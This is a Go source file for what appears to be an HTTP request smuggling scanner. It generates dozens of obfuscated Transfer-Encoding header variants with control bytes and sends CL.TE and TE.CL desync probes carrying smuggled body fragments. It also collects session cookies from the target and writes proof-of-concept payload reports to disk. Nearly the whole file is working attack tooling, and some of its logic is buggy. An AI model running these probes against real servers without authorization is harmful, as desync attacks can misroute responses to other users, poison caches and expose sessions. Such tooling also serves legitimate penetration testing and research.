package smuggler

import (
	"errors"
	"fmt"
	"io"
	"log"
	"math"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

type Glob struct {
	Cookie    string
	Uri       string
	Method    string
	Port      int
	Url       *url.URL
	Scheme    string
	Header    map[string]string
	Attempts  int
	ExitEarly bool
	Timeout   int
}

var (
	payloads map[string]Payload
	glob     Glob
)

// the idea is to disrupt the way http request are dealt with (typically in FIFO), if a user
// sneaks in a request in another request, the synchronization will be affected resulting in
// weird behaviours (users receiving response meant to be received by other users)
type Desyncer interface {
	test(*Payload) (int, []byte, Payload, error)
	testClte()
	testTecl(int, *Payload) (int, []byte, Payload, error) // returns 1 if connection timedout, 0 if normal response, 2 if disconnected before timeout
	GetCookies() (string, error)
	start()
	execTest(string, Payload)
}

type DesyncerImpl struct {
	Desyncer
}

func deepcopy(src *Payload) Payload {
	dst := Payload{}

	dst.Body = (*src).Body
	dst.Cl = (*src).Cl
	dst.Header = make(map[string]string)
	for k, v := range src.Header {
		dst.Header[k] = v
	}
	dst.Host = (*src).Host
	dst.Port = (*src).Port
	dst.ReqLine = ReqLine{
		Method:   (*src).ReqLine.Method,
		Path:     (*src).ReqLine.Path,
		Fragment: (*src).ReqLine.Fragment,
		Query:    (*src).ReqLine.Query,
		Version:  (*src).ReqLine.Version,
	}
	dst.Cl = (*src).Cl
	return dst
}

func PopPayload() {
	payloads = make(map[string]Payload)
	payloads["n"] = renderTemplate("Transfer-Encoding", "chunked")
	payloads["ps"] = renderTemplate(" Transfer-Encoding", " chunked")
	payloads["pt1"] = renderTemplate("Transfer-Encoding", "\tchunked")
	payloads["pt2"] = renderTemplate("Transfer-Encoding\t", "\tchunked")
	payloads["tse"] = renderTemplate("Transfer-Encoding ", " chunked")
	lst := []byte{0x1, 0x4, 0x8, 0x9, 0xa, 0xb, 0xc, 0xd, 0x1F, 0x20, 0x7f, 0xA0, 0xFF}
	for _, b := range lst {
		payloads[fmt.Sprintf("ms-%02x", b)] = renderTemplate("Transfer-Encoding", fmt.Sprintf("%cchunked", b))
		payloads[fmt.Sprintf("ts-%02x", b)] = renderTemplate(fmt.Sprintf("Transfer-Encoding%c", b), " chunked")
		payloads[fmt.Sprintf("ps-%02x", b)] = renderTemplate(fmt.Sprintf("%cTransfer-Encoding", b), " chunked")
		payloads[fmt.Sprintf("es-%02x", b)] = renderTemplate("Transfer-Encoding", fmt.Sprintf(" chunked%c", b))
		payloads[fmt.Sprintf("xp-%02x", b)] = renderTemplate(fmt.Sprintf("X: X%cTransfer-Encoding", b), " chunked")
		payloads[fmt.Sprintf("ex-%02x", b)] = renderTemplate("Transfer-Encoding", fmt.Sprintf(" chunked%cX: X", b))
		payloads[fmt.Sprintf("rx-%02x", b)] = renderTemplate(fmt.Sprintf("X: X\r%cTransfer-Encoding", b), " chunked")
		payloads[fmt.Sprintf("xn-%02x", b)] = renderTemplate(fmt.Sprintf("X: X%c\nTransfer-Encoding:", b), " chunked")
		payloads[fmt.Sprintf("erx-%02x", b)] = renderTemplate("Transfer-Encoding", fmt.Sprintf(" chunked\r%cX: X", b))
		payloads[fmt.Sprintf("exn-%02x", b)] = renderTemplate("Transfer-Encoding", fmt.Sprintf(" chunked%c\nX: X", b))
	}
}

func renderTemplate(k, v string) Payload {
	payload := Payload{}
	payload.ReqLine = ReqLine{
		Method:  strings.ToUpper(strings.TrimSpace(glob.Method)),
		Path:    glob.Url.Path,
		Version: "HTTP/1.1",
		Query:   fmt.Sprintf("q=%d", rand.Int63n(math.MaxInt64))}

	headers := make(map[string]string)
	headers["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0"
	headers["Connection"] = "Keep-alive"
	headers["Content-Type"] = "application/x-www-form-urlencoded"
	headers["Host"] = glob.Url.Host

	headers[k] = v
	payload.Header = headers
	for k, v := range glob.Header {
		payload.Header[k] = v
	}
	payload.Header["Cookie"] = glob.Cookie
	return payload
}

func (DesyncerImpl) GetCookies(g *Glob) (string, error) {
	glob = *g
	t := Transport{}

	headers := make(map[string]string)
	headers["Host"] = glob.Url.Host
	headers["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0"
	headers["Cache-Control"] = "no-store"
	headers["Pragma"] = "no-cache"
	headers["Accept"] = "*/*"
	// populate the global headers
	for k, v := range glob.Header {
		headers[k] = v
	}
	payload := Payload{Host: glob.Url.Host, Port: glob.Port, Header: headers,
		ReqLine: ReqLine{Method: "HEAD",
			Path: glob.Url.Path, Query: fmt.Sprint("nocache=", rand.Int63n(math.MaxInt64)), Version: "HTTP/1.1"}}

	resp, err := t.RoundTrip(&Request{Payload: &payload, Url: glob.Url})
	if err != nil {
		return "", err
	}
	resp.Body.Close()

	if v := getCookieVal(resp.Header, "Set-Cookie"); len(v) > 0 {
		cookies := make([]string, len(v))
		for i, c := range v {
			if idx := strings.Index(c, ";"); idx != -1 {
				cookies[i] = strings.TrimSpace(c[:idx])
			}
		}
		glob.Cookie = strings.Join(cookies, "; ")
	}
	return glob.Cookie, nil
}

func getCookieVal(hdr http.Header, key string) []string {
	if v := hdr.Values(key); len(v) > 0 {
		return v
	}
	if v := hdr.Values(strings.ToLower(key)); len(v) > 0 {
		return v
	}
	return nil
}

func (d DesyncerImpl) test(p *Payload) (int, []byte, *Payload, error) {
	t := Transport{}
	start := time.Now()
	resp, err := t.RoundTrip(&Request{Url: glob.Url, Payload: p})
	if err != nil {
		return int(resp.ContentLength), nil, p, err
	}
	diff := time.Since(start)

	var sample []byte = make([]byte, 100)
	if _, err = resp.Body.Read(sample); err != nil && err != io.EOF {
		return -1, nil, nil, fmt.Errorf("error while reading response received:%v", err)
	}
	resp.Body.Close()
	if len(sample) == 0 {
		if diff < time.Duration(time.Duration.Seconds(4.0)) {
			return 2, sample, p, nil // disconnected before timeout
		}
		return 1, sample, p, nil // connection timeout
	}
	headers := ""
	for k, v := range resp.Header {
		headers += fmt.Sprintf("%s: %s\n", k, v)
	}
	return 0, append([]byte(headers), sample...), p, nil // normal response
}

func (d DesyncerImpl) testTecl(ptype int, p *Payload) (int, []byte, *Payload, error) {
	_payload := deepcopy(p)
	if ptype == 0 {
		_payload.Cl = 6
	} else {
		_payload.Cl = 5
	}
	_payload.Body = "0\r\n\r\nG"
	return d.test(&_payload)
}

func (d DesyncerImpl) testClte(ptype int, p *Payload) (int, []byte, *Payload, error) {
	_payload := deepcopy(p)
	if ptype == 0 {
		_payload.Cl = 4
	} else {
		_payload.Cl = 11
	}
	_payload.Body = fmt.Sprintf("%X\r\nG\r\n0\r\n\r\n", 1) // if all the payload is sent, it should be a valid request
	return d.test(&_payload)                               //because encoding is terminated with a chunk of 0 value
}

func (d DesyncerImpl) execTest(k string, v *Payload) {
	startTime := time.Now()
	log.Printf("%s \ttesting tecl...\n", k)
	teclRet, teclRes, teclPayload, err := d.testTecl(0, v)
	if teclRet == -1 {
		fmt.Fprintln(os.Stderr, err)
		return
	}

	teclTime := time.Since(startTime)

	log.Printf("%s \ttesting clte...\n", k)
	startTime = time.Now()
	clteRet, clteRes, cltePayload, err := d.testClte(0, v)
	if clteRet == -1 {
		fmt.Fprintln(os.Stderr, err)
		return
	}
	clteTime := time.Since(startTime)

	if clteRet == 1 {
		clteRet2, _, _, err := d.testClte(1, v)
		if clteRet2 == -1 {
			fmt.Fprintln(os.Stderr, err)
			return
		}
		if clteRet2 == 0 {
			glob.Attempts += 1
			if glob.Attempts < 3 {
				d.execTest(k, v)
				return
			} else {
				log.Printf("Potential CLTE issue found - %s@%s%s%s\n", (*v).ReqLine.Method, (glob).Scheme, glob.Url.Host, glob.Url.Path)
				GenerateReport(k, cltePayload, clteTime, clteRes)
				if glob.ExitEarly {
					os.Exit(0)
				}
				glob.Attempts = 0
				return
			}
		} else {
			log.Printf("CLTE timeout on both length 4 and 11\n")
		}
	} else if teclRet == 1 {
		teclRet2, _, _, err := d.testTecl(1, v)
		if teclRet2 == -1 {
			fmt.Fprintln(os.Stderr, err)
			return
		}
		if teclRet2 == 0 {
			glob.Attempts += 1
			if glob.Attempts < 3 {
				d.execTest(k, v)
				return
			} else {
				log.Printf("Potential TECL issue found - %s@%s%s%s\n", (*v).ReqLine.Method, (glob).Scheme, glob.Url.Host, glob.Url.Path)
				GenerateReport(k, teclPayload, teclTime, teclRes)
				if glob.ExitEarly {
					os.Exit(0)
				}
				glob.Attempts = 0
				return
			}
		} else {
			log.Printf("TECL timeout on both length 5 and 6\n")
		}
	} else if teclRet == -1 || clteRet == -1 {
		log.Print("Socket error")
	} else if teclRet == 0 && clteRet == 0 {
		log.Print("No issues found")
	} else if teclRet == 2 || clteRet == 2 {
		log.Print("DISCONNECTED")
	}
	glob.Attempts = 0
}

func (d DesyncerImpl) Start() {
	for k, v := range payloads {
		d.execTest(k, &v)
	}
}

func GenerateReport(name string, p *Payload, t time.Duration, content []byte) {
	if err := createDir("/payloads/"); err != nil {
		fmt.Println(err)
	}
	pwd, err := os.Getwd()
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		return
	}
	fname := fmt.Sprintf("%s/payloads/%s_%s", pwd, strings.ReplaceAll(glob.Url.Host, ".", "_"), name)

	file, err := os.OpenFile(fname, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		fmt.Fprintf(os.Stderr, "%v\n", err)
		return
	}

	file.WriteString("Server reply\n-----------------------------\n" + string(content))
	for k, v := range p.Header {
		kl := strings.ToLower(strings.TrimSpace(k))
		if kl == "content-length" || kl == "transfer-encoding" {
			toFind := ""
			for i := 0; i <= 0xF; i++ {
				toFind += string(byte(i))
			}
			if !strings.ContainsAny(k, toFind) {
				break
			}
			fin := ""
			for i := 0; i < len(k); i++ {
				if k[i] <= 0xF {
					fin += fmt.Sprintf("\\x0%x", k[i])
				} else {
					fin += string(k[i])
				}
			}
			nk := fin
			fin = ""
			for i := 0; i < len(v); i++ {
				if v[i] < 0xF {
					fin += fmt.Sprintf("\\x0%x", v[i])
				} else {
					fin += string(v[i])
				}
			}
			v = fin
			p.Header[nk] = v
			delete(p.Header, k)
		}
	}
	file.WriteString("\nPoC Payload\n------------------------------\n" + (*p).ToString())
	file.Close()
}

func createDir(dir string) error {
	pwd, err := os.Getwd()
	if err != nil {
		return err
	}
	info, err := os.Stat(pwd + dir)
	flag := true
	if err != nil {
		if !errors.Is(err, os.ErrNotExist) {
			return err
		}
		flag = false
	}
	if flag {
		if !info.IsDir() {
			if err := os.Mkdir(pwd+dir, 0777); err != nil {
				return err
			}
		}
	} else {
		if err := os.Mkdir(pwd+dir, 0777); err != nil {
			return err
		}
	}
	return nil
}
